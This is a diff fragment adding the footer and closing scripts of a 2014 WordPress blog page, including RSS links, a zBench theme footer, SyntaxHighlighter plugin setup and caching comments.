+			<li><a href="http://vudang.com/feed/" title="Syndicate this site using RSS 2.0">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="http://vudang.disqus.com/latest.rss" title="The latest comments to all posts in RSS">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
+<li><a href="https://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>			</ul>
+</div>
+
+	</div><!-- end: #sidebar -->
+</div><!-- end: #sidebar-border --></div><!--wrapper-->
+<div class="clear"></div>
+<div id="footer">
+	<div id="footer-inside">
+		<p>
+			Copyright &copy; 2014 Vũ&#039;s Inner Peace			| Powered by <a href="http://zww.me">zBench</a> and <a href="http://wordpress.org/">WordPress</a>		</p>
+		<span id="back-to-top">&uarr; <a href="#" rel="nofollow" title="Back to top">Top</a></span>
+	</div>
+</div><!--footer-->
+<p style="text-align:center" class="yd_linkware"><small><a href="http://www.yann.com/en/wp-plugins/yd-buddypress-feed-syndication"></a></small></p><script type='text/javascript' src='http://vudang.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/shCore.js?ver=2.1.364'></script>
+<script type='text/javascript' src='http://vudang.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/shBrushPython.js?ver=2.1.364'></script>
+<script type='text/javascript'>
+	(function(){
+		var corecss = document.createElement('link');
+		var themecss = document.createElement('link');
+		var corecssurl = "http://vudang.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/styles/shCore.css?ver=2.1.364";
+		if ( corecss.setAttribute ) {
+				corecss.setAttribute( "rel", "stylesheet" );
+				corecss.setAttribute( "type", "text/css" );
+				corecss.setAttribute( "href", corecssurl );
+		} else {
+				corecss.rel = "stylesheet";
+				corecss.href = corecssurl;
+		}
+		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
+		var themecssurl = "http://vudang.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/styles/shThemeDefault.css?ver=2.1.364";
+		if ( themecss.setAttribute ) {
+				themecss.setAttribute( "rel", "stylesheet" );
+				themecss.setAttribute( "type", "text/css" );
+				themecss.setAttribute( "href", themecssurl );
+		} else {
+				themecss.rel = "stylesheet";
+				themecss.href = themecssurl;
+		}
+		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
+		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
+	})();
+	SyntaxHighlighter.config.clipboardSwf = 'http://vudang.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf';
+	SyntaxHighlighter.config.strings.expandSource = 'show source';
+	SyntaxHighlighter.config.strings.viewSource = 'view source';
+	SyntaxHighlighter.config.strings.copyToClipboard = 'copy to clipboard';
+	SyntaxHighlighter.config.strings.copyToClipboardConfirmation = 'The code is in your clipboard now';
+	SyntaxHighlighter.config.strings.print = 'print';
+	SyntaxHighlighter.config.strings.help = '?';
+	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
+	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
+	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
+	SyntaxHighlighter.defaults['pad-line-numbers'] = true;
+	SyntaxHighlighter.defaults['tab-size'] = 2;
+	SyntaxHighlighter.all();
+</script>
+<script type='text/javascript' src='http://vudang.com/wp-includes/js/comment-reply.min.js?ver=3.9.1'></script>
+</body>
+</html>
+<!-- Dynamic page generated in 0.866 seconds. -->
+<!-- Cached page generated by WP-Super-Cache on 2014-06-30 14:42:51 -->
+
+<!-- super cache -->
